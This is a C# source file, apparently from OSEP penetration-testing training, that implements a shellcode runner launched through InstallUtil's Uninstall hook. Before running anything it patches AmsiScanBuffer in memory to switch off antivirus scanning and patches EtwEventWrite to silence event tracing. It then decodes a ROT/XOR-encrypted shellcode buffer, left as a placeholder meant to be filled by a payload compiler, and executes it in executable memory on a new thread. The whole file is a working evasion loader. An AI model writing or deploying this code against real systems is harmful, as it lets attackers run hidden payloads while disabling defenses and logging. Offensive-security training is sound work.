using System;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Reflection;

namespace OSEP
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("OSEP InstallUtil Shellcode Runner (Surgical Edition)");
            Console.WriteLine("Usage: installutil.exe /U /LHOST=<ignored> /LPORT=<ignored> <this_exe>");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtilBypass : System.Configuration.Install.Installer
    {
        // --- DELEGATES FOR SURGICAL API CALLS ---
        private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate IntPtr CreateThreadDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        private delegate uint WaitForSingleObjectDelegate(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string lpFileName);

        static void StealthInit()
        {
            try {
                IntPtr hAmsi = GetModuleHandle("amsi.dll");
                if (hAmsi == IntPtr.Zero) hAmsi = LoadLibrary("amsi.dll");
                if (hAmsi != IntPtr.Zero) {
                    IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
                    byte[] patch = { 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
                    uint oldProtect;
                    VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, 0x40, out oldProtect);
                    Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
                    VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                }
            } catch { }

            try {
                IntPtr hNtdll = GetModuleHandle("ntdll.dll");
                IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
                byte[] patch = { 0xC2, 0x14, 0x00 }; // ret 14
                uint oldProtect;
                VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
                VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            } catch { }
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            StealthInit();

            // --- SHELLCODE PLACEHOLDERS (Managed by PayloadCompiler.py) ---
            byte[] sc_buf = new byte[] { 0x00 };
            byte sc_xor_key = 0;
            int sc_rot_key = 0;

            if (sc_buf.Length <= 1) return;

            // --- DECRYPTION (ROT then XOR) ---
            // Compiler: (byte + ROT) ^ XOR
            // De-compiler: (byte ^ XOR) - ROT
            for (int i = 0; i < sc_buf.Length; i++)
            {
                byte decrypted = (byte)(sc_buf[i] ^ sc_xor_key);
                sc_buf[i] = (byte)((decrypted - sc_rot_key + 256) % 256);
            }

            // --- SURGICAL EXECUTION ---
            IntPtr k32 = GetModuleHandle("kernel32.dll");
            
            IntPtr pVirtualAlloc = GetProcAddress(k32, "VirtualAlloc");
            var vAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(pVirtualAlloc, typeof(VirtualAllocDelegate));

            IntPtr pCreateThread = GetProcAddress(k32, "CreateThread");
            var cThread = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(pCreateThread, typeof(CreateThreadDelegate));

            IntPtr pWaitForSingleObject = GetProcAddress(k32, "WaitForSingleObject");
            var wWait = (WaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(pWaitForSingleObject, typeof(WaitForSingleObjectDelegate));

            IntPtr addr = vAlloc(IntPtr.Zero, (uint)sc_buf.Length, 0x3000, 0x40);
            Marshal.Copy(sc_buf, 0, addr, sc_buf.Length);

            uint threadId;
            IntPtr hThread = cThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);
            wWait(hThread, 0xFFFFFFFF);
        }
    }
}
